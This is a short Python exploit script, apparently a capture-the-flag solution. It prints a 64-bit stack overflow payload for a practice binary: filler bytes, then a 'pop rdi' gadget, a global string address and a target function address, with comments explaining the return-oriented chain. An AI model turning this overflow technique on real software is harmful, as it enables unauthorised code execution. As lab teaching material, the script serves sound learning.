#!/usr/bin/python

import struct

# The simple way:
# We just send a couple of As to reach just before the rip
# and then overflow it with the address of the target function.
#print("a"*24 + "\xd0\x11\x40\x00\x00\x00\x00\x00")

# The bonus solution:
# We need rdi register here and the pop instruction, which is used to 
# pass to a register a value from the top of the stack. This needed because,
# in assembly level, parameters are loaded in functions using registers 
# (64 bit arch) and the rdi is used for the function's first parameter.
# Moreover there is a global containg our target, so we will put its address
# on top of the stack, and pop rdi before it.

pop_rdi = "\xab\x12\x40\x00\x00\x00\x00\x00"
cat_address = "\x08\x20\x40\x00\x00\x00\x00\x00"
fun = "\x72\x11\x40\x00\x00\x00\x00\x00"

print("a"*24 + pop_rdi + cat_address + fun)
